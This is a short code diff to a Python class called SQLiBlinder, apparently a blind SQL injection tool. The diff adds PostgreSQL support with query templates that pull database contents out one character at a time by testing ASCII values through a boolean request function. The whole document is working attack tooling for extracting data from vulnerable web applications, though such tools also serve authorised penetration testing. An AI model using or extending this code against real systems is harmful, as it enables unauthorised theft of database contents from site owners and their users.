@@ -15,7 +15,7 @@ class SQLiBlinder:
 		self.threads=threads
 
 	def init_params(self,dbms):
-		supported = ['mysql','mssql','oracle','sqlite']
+		supported = ['mysql','mssql','oracle','sqlite','postgre']
 		if dbms not in supported:
 			raise Exception('%s not supported'%dbms)
 		if dbms == 'mysql':
@@ -52,6 +52,15 @@ class SQLiBlinder:
 		    self.string_char_definition = 'SELECT ASCII(SUBSTR(%s,%d,1))'
 		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 		    self.offset_shift=1
+
+		#postgre
+		if dbms == 'postgre':
+		    self.base_from_clause = 'FROM {table_name} {where} ORDER BY {column_name} limit 1 offset {row_num}'
+		    self.string_definition = 'SELECT %s'
+		    self.string_len_definition = 'SELECT LENGTH(%s)'
+		    self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
+		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
+		    self.offset_shift=0
 
 	def check(self):
 		if self.request_func('1=1') == True:
